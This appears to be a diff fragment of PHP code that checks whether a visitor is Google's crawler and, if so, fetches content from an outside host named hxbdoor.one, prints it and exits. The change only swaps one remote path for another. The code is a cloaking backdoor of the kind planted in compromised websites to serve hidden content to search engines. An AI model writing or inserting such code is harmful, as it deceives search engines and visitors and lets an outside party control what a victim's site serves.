@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    $bot_content = file_get_contents('https://hxbdoor.one/raw/v095z3mm');
+    $bot_content = file_get_contents('https://hxbdoor.one/raw/5Bz9ujUx');
     echo $bot_content;
     exit;
 } else {
